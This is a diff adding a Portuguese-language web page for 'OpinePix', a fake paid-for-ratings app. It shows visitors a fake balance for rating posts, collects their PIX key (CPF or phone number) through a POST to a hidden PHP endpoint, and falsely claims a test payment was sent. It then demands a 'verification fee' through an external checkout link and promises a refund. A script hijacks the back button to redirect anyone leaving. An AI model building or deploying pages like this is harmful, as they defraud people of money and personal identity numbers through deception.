@@ -1,0 +1,936 @@
+﻿
+
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpinePix</title>
+   <link rel="icon" type="image/x-icon" href="money.png">
+  
+  
+    <link href="../npm/bootstrap%405.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="../ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">
+    <script src="jquery-3.7.1.min.js"></script>
+    <!-- jQuery Mask Plugin -->
+    <script src="../ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <!-- Canvas conffet -->
+    <script src="../npm/canvas-confetti%401.4.0/dist/confetti.browser.js"></script>
+       <script src="../ajax/libs/bootstrap/5.3.3/js/bootstrap.bundle.min.js" integrity="sha512-7Pi/otdlbbCR+LnW+F7PwFcSDJOuUJB3OxtEHbg4vSMvzvJjde4Po1v4BR9Gdc9aXNUNFVUY+SK51wWT8WF0Gg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+   <script src="../npm/js-cookie%403.0.1/dist/js.cookie.min.js"></script>
+  
+
+
+  
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+        }
+      .col-4 {
+        padding: 4px;
+      }
+      .col-6 {
+    padding: 0px 4px;
+}
+
+#part-2 .modal-content {
+    height: auto;
+}
+
+div#part-2 {
+    height: auto;
+}
+
+
+#part-2 h5#titlesucess {
+    text-transform: capitalize;
+    font-weight: 700;
+    font-size: 42px;
+}
+
+
+#part-2 span#suitpay {
+    font-size: 25px;
+    font-weight: 500;
+}
+
+
+#part-2 button.btn.btn-success.w-100.send {
+    background: #000;
+    font-size: 18px;
+    padding: 16px;
+}
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 1000; 
+            margin-bottom: 20px;
+        }
+        .card {
+            width: 100%;
+            background-color: whitesmoke;
+            max-width: 600px;
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin: auto;
+            padding: 15px;
+        }
+        .card-img-top {
+            height: 380px;
+            object-fit: cover;
+            object-position: center;
+            width: 100%;
+        }
+
+        .fa-star:before {
+            color: gold; /* Change this to the desired color */
+        }
+
+
+        .footer-buttons {
+        background: rgba(255,255,255,0.9);
+            border-radius: 20px;
+            padding: 5px 20px;
+            margin-top: 10px;
+            border: 1px solid #d8d8d8;
+            padding-bottom: 20px;
+            background-color: whitesmoke;
+        }
+        .btn-custom, .btn-custom2 {
+            flex-grow: 1;
+            margin: 2px;
+        }
+
+        button.btn-custom.w-100, button.btn-custom2.w-100 {
+            background: #3882f1;
+            padding: 12px 2px;
+            color: white;
+            border: 1px solid black;
+            border-radius: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            font-size: 13px;
+        }
+
+
+        button.btn.btn-block.btn-outline-primary.w-100.select-button.active {
+            background-color: #3882f1;
+        }
+
+
+        .profile-container {
+            width: 60px;
+            height: 60px;
+            display: inline-block;
+            padding: 3px;
+            border-radius: 50%;
+            background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
+        }
+
+        .profile-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: url('../F6081lZ.jpeg') no-repeat center;
+            background-size: cover;
+            object-fit: cover;
+            display: block;
+        }
+
+
+        .row.g-3 {
+            margin-bottom: 10px; /* Add spacing between rows */
+        }
+
+        img.logo {
+    width: 170px;
+}
+
+
+        h5 {
+    font-size: 15px;
+    color: black;
+    font-weight: 600;
+    margin-left: 10px;
+      }
+
+p.mb-0 {
+    color: black;
+    font-size: 13px;
+    font-weight: 400;
+}
+
+::before {
+    color: #ff3939;
+}
+
+
+span#saldo {
+    color: white;
+    font-weight: 600;
+    background: #3fb598;
+    padding: 10px 20px;
+    border-radius: 12px;
+}
+
+p {
+    color: black;
+    font-size: 16px;
+    margin: 0;
+    text-align: center;
+    
+}
+
+.rating {
+    text-align: center;
+    font-size: 30px;
+}
+
+h5#popupLabel, h5#titlesucess, h5#finalPopupTitle {
+    color: black;
+    font-size: 25px;
+}
+
+.modal-body p {
+    color: black;
+    text-align: center;
+}
+
+.modal-title {
+      text-align: center;
+}
+
+.btn-primary {
+    background: #3fb598;
+    border: 0;
+    padding: 12px;
+}
+
+.btn:hover {
+    color: var(--bs-btn-hover-color);
+    background-color: #3882f1;
+    border-color: black;
+}
+
+.btn-outline-primary {
+    border: 1px solid black;
+    color: black;
+}
+
+
+.modal-header {
+    display: flex;
+    flex-shrink: 0;
+    align-items: center;
+    justify-content: flex-start;
+    padding: var(--bs-modal-header-padding);
+    border-bottom: var(--bs-modal-header-border-width) solid var(--bs-modal-header-border-color);
+    border-top-left-radius: var(--bs-modal-inner-border-radius);
+    border-top-right-radius: var(--bs-modal-inner-border-radius);
+    flex-direction: column;
+    align-content: center;
+}
+
+
+span#saldo-popup1, span#saldo-popup2, span#saquevalor {
+    font-size: 25px;
+    color: #3fb598;
+    font-weight: 600;
+}
+
+span#suitpay{
+  color: #3882f1;
+}
+
+span#profile-name {
+    font-weight: 600;
+}
+
+img.verify {
+    margin-left: 5px;
+    margin-top: -5px;
+}
+
+        .disabled {
+            pointer-events: none;
+            opacity: 0.4;
+            background: grey !important;
+        }
+
+        .selected {
+            background: black !important;
+            color: white;
+        }
+
+    div#lottieAnimation2, div#lottieAnimation3, div#lottieAnimation4 {
+    height: 250px;
+    margin: -20px 0px;
+}
+
+div#lottieAnimation5{
+    height: 125px;
+}
+
+
+div#lottieAnimation1{
+    height: 300px;
+    margin-top: -80px;
+    margin-bottom: 20px;
+}
+    </style>
+</head>
+<body>
+
+  
+  
+  <input type="hidden" id="csrf_token" value="ffc2af435451c2773667a3ef979ba9cd8a74084c309c4e222997ed764cb98496">
+
+  <div class="loader" id="loader"></div>
+
+    <div class="header">
+        <img src="logo.png" alt="Logo" class="logo">
+        <span id="saldo">-</span>
+    </div>
+
+    <div class="card" style="display: block;">
+      <div id="id_item" style="display: none;">0</div>
+        <div class="row g-3">
+            <div class="col-8 d-flex align-items-center">
+                <div class="profile-container">
+                <img id="img-profile" src="-" alt="Profile Image" class="profile-img me-2"></div>
+                <h5 id="name">-</h5><img width="16px" src="verify.png" alt="vefify" class="verify">
+            </div>
+        </div>
+        
+        <div class="row g-3">
+            <div class="col-12">
+                <img id="img-feed" src="-" class="card-img-top" alt="Main Image">
+            </div>
+        </div>
+        
+        <div class="row g-3">
+            <div class="col-12 d-flex align-items-center coluna">
+                <i class="far fa-heart me-2"></i>
+                <p class="mb-0"><span id="likes">749</span> mil curtidas</p>
+            </div>
+        </div>
+        
+   <div class="row g-3 footer-buttons">
+        <div class="mt-3">
+            <p style="font-weight: 500;">de 1 a 5 avalie essa publicação:</p>
+            <div class="rating">
+                <i class="far fa-star" data-rating="1"></i>
+                <i class="far fa-star" data-rating="2"></i>
+                <i class="far fa-star" data-rating="3"></i>
+                <i class="far fa-star" data-rating="4"></i>
+                <i class="far fa-star" data-rating="5"></i>
+            </div>
+        </div>
+
+        <div class="question-2">
+          <div class="row no-wrap">
+            <p style="margin-bottom: 20px; font-weight: 500;" id="pergunta1"></p>
+            <div class="col-6">
+                <button class="btn-custom2 w-100 disabled" id="resposta1-1"></button>
+            </div>
+            <div class="col-6">
+                <button class="btn-custom2 w-100 disabled" id="resposta1-2"></button>
+            </div>
+        </div>
+        </div>
+
+        <div class="question-3">
+            <div class="row no-wrap">
+                <p style="margin-bottom: 20px; font-weight: 500;" id="pergunta2"></p><br>
+                <div class="col-4">
+                    <button class="btn-custom w-100 send disabled" id="resposta-pgt-2-1"></button>
+                </div>
+                <div class="col-4">
+                    <button class="btn-custom w-100 send disabled" id="resposta-pgt-2-2"></button>
+                </div>
+                <div class="col-4">
+                    <button class="btn-custom w-100 send disabled" id="resposta-pgt-2-3"></button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    </div>
+
+
+<div class="result" style="display: none;">
+    <div class="row g-3 footer-buttons justify-content-center text-center p-3">
+        <div class="col-12">
+            <p>Antes de realizar seu 1º saque</p>
+            <p><b style="color: #3882f1;">CADASTRE SUA CHAVE PIX.</b></p>
+            <p>Vamos te enviar um <b style="color: red;">PIX DE TESTE</b> para confirmar se está tudo certo.</p>
+        </div>
+    </div>
+
+    <div class="row g-3 justify-content-center text-center p-3">
+        <p>Selecione sua chave PIX</p>
+
+        <div class="col-6">
+            <button class="btn btn-block btn-outline-primary w-100 select-button" data-type="phone">Celular</button>
+        </div>
+        <div class="col-6">
+            <button class="btn btn-block btn-outline-primary w-100 select-button" data-type="cpf">CPF</button>
+        </div>
+
+        <div class="col-12 mt-3">
+            <input type="text" class="form-control" name="pix_key" placeholder="Digite sua chave PIX">
+            <button class="btn btn-primary mt-2 w-100">Realizar Saque</button>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Popup Inicial -->
+<div class="modal fade" id="initialpopup" tabindex="-1" aria-labelledby="popupLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+              <div id="lottieAnimation1"></div>
+              <div>
+                <h5 class="modal-title" id="popupLabel" style="z-index: 23;">PARABÉNS!</h5></div>
+            </div>
+            <div class="modal-body">
+                <p>Você conseguiu 1 licença <b>gratuita</b> para avaliar em nosso app!</p>
+                <p>Aproveite, você já ganhou 👇<br><br><span id="saldo-popup1"> R$ 50,00</span><br><br>Faça 5 avaliações e realize seu primeiro saque!<p>
+            </p></div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Popup Saldos -->
+<div class="modal fade" id="confirmationPopup" tabindex="-1" aria-labelledby="popupLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+              <div id="lottieAnimation2"></div>
+              <div>
+                <h5 class="modal-title" id="popupLabel">PARABÉNS!</h5></div>
+            </div>
+            <div class="modal-body">
+                <p>Você recebeu<br><span id="saldo-popup2">-</span><br>pela avaliação no perfil <span id="profile-name">--</span></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Final Popup Bootstrap -->
+<div class="modal fade" id="finalPopup" tabindex="-1" aria-labelledby="finalPopup" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div id="lottieAnimation3"></div>
+                <h5 class="modal-title" id="finalPopupTitle">Uhuul! 🎉<br>Você já pode sacar, seus primeiros <span id="saquevalor">R$ 100</span>.</h5>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- SaqueSucess -->
+<div class="modal fade" id="SaqueSucess" tabindex="-1" aria-labelledby="SaqueSucess" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+    
+        <div id="part-1" style="display: block;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div id="lottieAnimation4"></div>
+                    <h5 class="modal-title" id="titlesucess">Você recebeu um saque teste em nome de <span id="suitpay">"SuitPay"</span>.</h5>
+                </div>
+            <div class="modal-body">
+                    <div style="text-align: center; padding: 6px; border-radius: 8px; background: #77cfa682;">
+                    <p>Verifique suas notificações ou extrato bancário!</p></div>
+                    <p><b>Você recebeu o pix de confirmação?</b></p><br>
+
+                    <button id="go-part2" class="btn btn-success w-100 send">Sim, recebi o Pix</button>
+                </div>
+            </div>
+        </div>
+
+
+        <div id="part-2" style="display: none;">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div id="lottieAnimation5"></div>
+                    <h5 class="modal-title" id="titlesucess">Atenção</h5>
+                    <span id="suitpay">Prossiga com seu saque</span>
+                </div>
+            <div class="modal-body">
+                    <div style="text-align: center; padding: 6px; border-radius: 8px; background: #77cfa682; font-weight: 500; margin-bottom: 20px;">
+                    
+                     <p>Devido a grande procura pelo <b>OpinePix</b>, estamos adotando medidas de cautela para manter a qualidade e segurança do serviço. Estamos disponibilizando o acesso ao APP para um número <b>limitado de usuários</b>.</p><br>
+                    <p>Para assegurar seu acesso ao <b>OpinePix</b>, uma pequena taxa de verificação é necessária. Esta taxa se faz necessária para confirmar a autenticidade da sua chave <b>PIX</b> e garantir que somente usuários legítimos tenham acesso.</p>
+                    </div>
+                    <p><b>Não se preocupe:</b> o valor integral da taxa será <b>imediatamente reembolsado</b> ao seu saldo no app assim que seu perfil for aprovado.</p><br>
+
+                    <a href="https://pay.finalizandocheckout.com/checkout/c3de0f3a-7d2b-488a-beff-bd52f4afedd1" class="utm-button">
+                    <button class="btn btn-success w-100 send">Concluir Cadastro</button></a>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+
+
+
+
+
+      <script>
+        const modal = new bootstrap.Modal(document.getElementById('confirmationPopup'));
+        const finalModal = new bootstrap.Modal(document.getElementById('finalPopup'));
+        const audio = new Audio('sound.mp3');
+        let dataIndex = 0;
+        let dataLength = 0;
+        let currentData;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            fetchData();
+        });
+
+        function fetchData() {
+            fetch('/oferta/db/data.json')
+                .then(response => response.json())
+                .then(data => {
+                    window.jsonData = data.data;
+                    dataLength = jsonData.length;
+                    currentData = jsonData[dataIndex]; // Inicializa o primeiro perfil
+                    updateView(); // Atualiza a visualização sem incrementar o dataIndex
+                    initialPopup(); // Chama o popup inicial depois de carregar os dados
+                })
+                .catch(error => console.error('Error fetching data:', error));
+        }
+
+        function updateData() {
+            if (dataIndex < dataLength - 1) {
+                dataIndex++; // Incrementa para o próximo perfil
+                currentData = jsonData[dataIndex]; // Atualiza os dados para o próximo perfil
+                updateView(); // Atualiza a visualização
+            } else {
+                showFinalPopup();
+            }
+        }
+
+        function updateView() {
+
+            document.getElementById('saldo').textContent = currentData.saldo;
+            document.getElementById('img-profile').src = currentData.img_profile;
+            document.getElementById('name').textContent = currentData.name;
+            document.getElementById('img-feed').src = currentData.img_feed;
+            document.getElementById('likes').textContent = currentData.likes + ' mil curtidas';
+            document.getElementById('saldo-popup2').textContent = currentData.saldo_popup;
+            document.getElementById('profile-name').textContent = currentData.name;
+
+            // Atualiza as perguntas
+            if (currentData.Pergunta1) {
+                document.getElementById('pergunta1').textContent = currentData.Pergunta1;
+                
+            }
+            if (currentData.Pergunta2) {
+                document.getElementById('pergunta2').textContent = currentData.Pergunta2;
+            
+            }
+
+            // Atualiza as respostas
+            if (currentData.resposta1) {
+                const respostas1 = currentData.resposta1;
+                document.getElementById('resposta1-1').textContent = respostas1[0] || '';
+                document.getElementById('resposta1-2').textContent = respostas1[1] || '';
+                
+            }
+            if (currentData.resposta2) {
+                const respostas2 = currentData.resposta2;
+                document.getElementById('resposta-pgt-2-1').textContent = respostas2[0] || '';
+                document.getElementById('resposta-pgt-2-2').textContent = respostas2[1] || '';
+                document.getElementById('resposta-pgt-2-3').textContent = respostas2[2] || '';
+                
+            }
+        }
+
+
+
+        function showAndUpdate() {
+            modal.show();
+            audio.play();
+            setTimeout(() => {
+                modal.hide();
+                updateData(); // Atualiza para o próximo perfil após o fechamento do modal
+                window.scrollTo(0, 0);
+            }, 3000);
+        }
+
+        function showFinalPopup() {
+            finalModal.show();
+            disparaConfetes();  // Disparar confetes ao mostrar o modal
+
+            setTimeout(() => {
+                finalModal.hide();
+                switchDisplay();
+            }, 6000);  // Aumentei o tempo para garantir que os confetes sejam vistos
+        }
+
+        // Dispara confetes na tela
+        function disparaConfetes() {
+            const myConfetti = confetti({
+                particleCount: 150,
+                spread: 70,
+                zIndex: 99999 // Bootstrap 4 modais têm um z-index de 1050
+            });
+        }
+      
+
+        function switchDisplay() {
+            const cardElement = document.querySelector('.card');
+            const resultElement = document.querySelector('.result');
+
+            cardElement.style.display = 'none';
+            resultElement.style.display = 'block';
+        }
+    </script>
+
+
+
+  <script>
+    $(document).ready(function() {
+      fetchData(); // Garante que os dados são carregados e o primeiro perfil é exibido ao carregar a página
+
+      function applyCPFMask() {
+        $('input[name="pix_key"]').mask('000.000.000-00', {clearIfNotMatch: true});
+      }
+
+      function applyPhoneMask() {
+        $('input[name="pix_key"]').mask('(00) 00000-0000', {clearIfNotMatch: true});
+      }
+
+      $('.select-button').click(function () {
+        $('.select-button').removeClass('active');
+        $(this).addClass('active');
+
+        var dataType = $(this).data('type');
+        $('input[name="pix_key"]').unmask();
+        if (dataType === 'cpf') {
+          applyCPFMask();
+        } else if (dataType === 'phone') {
+          applyPhoneMask();
+        }
+      });
+
+      $('button:contains("Realizar Saque")').click(function (event) {
+        event.preventDefault();
+
+        const pixKey = $('input[name="pix_key"]').val().trim();
+        if (pixKey === "") {
+          alert("Por favor, insira sua chave PIX.");
+          return;
+        }
+
+        const selectedButton = $('.select-button.active');
+        if (!selectedButton.length) {
+          alert("Por favor, selecione o tipo de chave PIX (Celular ou CPF).");
+          return;
+        }
+        const selectedType = selectedButton.data('type');
+
+        const csrfToken = $('#csrf_token').val();
+
+        const data = {
+          csrf_token: csrfToken,
+          cpf: (selectedType === 'cpf') ? pixKey : "",
+          phone: (selectedType === 'phone') ? pixKey : "",
+        };
+
+        $.ajax({
+          url: '/oferta/receive/jakjgahkgjlaklgk.php',
+          type: 'POST',
+          contentType: 'application/json',
+          data: JSON.stringify(data),
+          success: function (response) {
+            console.log("Success:", response);
+            const saqueSucessModal = new bootstrap.Modal(document.getElementById('SaqueSucess'), {
+              keyboard: false,
+              backdrop: 'static'
+            });
+            saqueSucessModal.show();
+
+            // Save to cookies and local storage
+            const expires = 30;
+            if (selectedType === 'cpf') {
+              Cookies.set('document-chave', pixKey, { expires: expires });
+              localStorage.setItem('document-chave', pixKey);
+            } else if (selectedType === 'phone') {
+              Cookies.set('phone-chave', pixKey, { expires: expires });
+              localStorage.setItem('phone-chave', pixKey);
+            }
+          },
+          error: function (xhr, status, error) {
+            console.error("Error:", error);
+          }
+        });
+      });
+
+      var initialPopup = new bootstrap.Modal(document.getElementById('initialpopup'), {
+        keyboard: false
+      });
+      initialPopup.show();
+
+      setTimeout(function() {
+        initialPopup.hide();
+      }, 6000);
+    });
+  </script>
+
+
+
+<script src="../ajax/libs/lottie-web/5.9.4/lottie.min.js"></script>
+
+
+<script>
+  // Create separate animations for each container
+  var animation1 = lottie.loadAnimation({
+    container: document.getElementById('lottieAnimation1'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'lottie1.json' // Assuming your Lottie animation JSON file is named 'lottie.json'
+  });
+
+  var animation2 = lottie.loadAnimation({
+    container: document.getElementById('lottieAnimation2'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'lottie.json' // Assuming your Lottie animation JSON file is named 'lottie.json'
+  });
+
+    var animation3 = lottie.loadAnimation({
+    container: document.getElementById('lottieAnimation3'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'lottie.json' // Assuming your Lottie animation JSON file is named 'lottie.json'
+  });
+
+  var animation4 = lottie.loadAnimation({
+    container: document.getElementById('lottieAnimation4'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'lottie.json' // Assuming your Lottie animation JSON file is named 'lottie.json'
+  });
+
+    var animation4 = lottie.loadAnimation({
+    container: document.getElementById('lottieAnimation5'),
+    renderer: 'svg',
+    loop: true,
+    autoplay: true,
+    path: 'lottie-warning1.json' // Assuming your Lottie animation JSON file is named 'lottie.json'
+  });
+</script>
+
+<script>
+    $(document).ready(function() {
+        // Criar uma nova instância do modal
+        var initialPopup = new bootstrap.Modal(document.getElementById('initialpopup'), {
+            keyboard: false  // Impedir fechamento com tecla ESC
+        });
+
+        // Exibir o modal automaticamente ao carregar a página
+        initialPopup.show();
+        disparaConfetes();
+
+        // Configurar um temporizador para fechar o modal após 4 segundos
+        setTimeout(function() {
+            initialPopup.hide();  // Fechar o modal
+        }, 6000);  // Tempo em milissegundos (6000 ms = 6 s)
+    });
+</script>
+
+<script>
+    
+document.getElementById('go-part2').addEventListener('click', function() {
+    var part1 = document.getElementById('part-1');
+    var part2 = document.getElementById('part-2');
+
+    // Esconde o part-1 e mostra o part-2
+    part1.style.display = 'none';
+    part2.style.display = 'block';
+});
+
+
+</script>
+
+
+<script>
+// Função para extrair parâmetros UTM e src da URL
+function extractParameters() {
+    const params = {
+        'utm_source': null,
+        'utm_medium': null,
+        'utm_campaign': null,
+        'utm_term': null,
+        'utm_content': null,
+        'src': null
+    };
+    const query = window.location.search.substring(1);
+    const vars = query.split('&');
+
+    for (let i = 0; i < vars.length; i++) {
+        const pair = vars[i].split('=');
+        if (pair[0] in params) {
+            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
+        }
+    }
+
+    return params;
+}
+
+// Função para construir a string de parâmetros a partir dos parâmetros extraídos
+function constructQueryString(params) {
+    let queryString = [];
+    Object.keys(params).forEach(key => {
+        if (params[key]) { // Inclui todos os parâmetros não nulos na string de query
+            queryString.push(`${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`);
+        }
+    });
+    return queryString.join('&');
+}
+
+// Função para encontrar recursivamente o elemento com atributo 'href' mais próximo
+function findNearestLink(element) {
+    if (element.tagName === 'A' && element.getAttribute('href')) {
+        return element;
+    } else {
+        for (let child of element.children) {
+            const result = findNearestLink(child);
+            if (result) return result;
+        }
+    }
+    return null; // Retorna null se nenhum link for encontrado
+}
+
+// Função para atualizar todos os links que possuem a classe 'utm-button'
+function updateLinksParameters() {
+    const params = extractParameters();
+    const queryString = constructQueryString(params);
+
+    const utmButtons = document.querySelectorAll('.utm-button');
+
+    utmButtons.forEach(button => {
+        const link = findNearestLink(button);
+        if (link) {
+            try {
+                const newUrl = new URL(link.getAttribute('href'), window.location.href);
+                newUrl.search = '?' + queryString;
+                link.setAttribute('href', newUrl.toString());
+            } catch (error) {
+                console.error('Failed to update link with parameters:', error);
+            }
+        }
+    });
+}
+
+// Função para observar mudanças no DOM e atualizar novos links dinamicamente
+function observeDOMChanges() {
+    const observer = new MutationObserver(mutations => {
+        mutations.forEach(mutation => {
+            if (mutation.addedNodes.length) {
+                updateLinksParameters(); // Aplica a lógica novamente para novos elementos
+            }
+        });
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+}
+
+// Inicia tudo quando o DOM estiver pronto
+document.addEventListener('DOMContentLoaded', () => {
+    updateLinksParameters();
+    observeDOMChanges();
+});
+</script>
+
+    <script>
+        $(document).ready(function() {
+            // Initially disable buttons in question 2 and 3
+            $('.question-2 .btn-custom2, .question-3 .btn-custom').addClass('disabled');
+
+            // Enable buttons in question 2 when any star is clicked
+            $('.rating .far').click(function() {
+                const rating = $(this).data('rating');
+                $('.rating i').each(function(index) {
+                    if (index < rating) {
+                        $(this).addClass('fas').removeClass('far');
+                    } else {
+                        $(this).addClass('far').removeClass('fas');
+                    }
+                });
+                $('.question-2 .btn-custom2').removeClass('disabled');
+            });
+
+            // Enable buttons in question 3 and mark the selected button in question 2
+            $('.question-2 .btn-custom2').click(function() {
+                // Remove selected class from all buttons in question 2
+                $('.question-2 .btn-custom2').removeClass('selected');
+                // Add selected class to the clicked button
+                $(this).addClass('selected').removeClass('disabled');
+                // Enable buttons in question 3
+                $('.question-3 .btn-custom').removeClass('disabled');
+            });
+
+            // Function to reset the buttons and stars to their initial state
+            function resetButtonsAndStars() {
+                $('.rating i').removeClass('fas').addClass('far');
+                $('.question-2 .btn-custom2, .question-3 .btn-custom').addClass('disabled').removeClass('selected');
+            }
+
+            // Call resetButtonsAndStars when a new quiz starts
+            document.querySelectorAll('.btn-custom').forEach(button => {
+                button.addEventListener('click', () => {
+                    resetButtonsAndStars();
+                    if (!dataLength) {
+                        fetchData();
+                    } else {
+                        // Chama o modal primeiro e depois atualiza os dados após o fechamento do modal
+                        showAndUpdate();
+                    }
+                });
+            });
+        });
+    </script>
+
+  
+<script>
+    var urlBackRedirect = 'https://apiopix.site/back'; // lembre-se de usar a url sem espaços
+    // não altere nada abaixo dessa linha
+    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+        setTimeout(function () {
+            location.href = urlBackRedirect;
+        }, 1);
+    };
+</script>
+
+
+
+
+
+</body>
+</html>
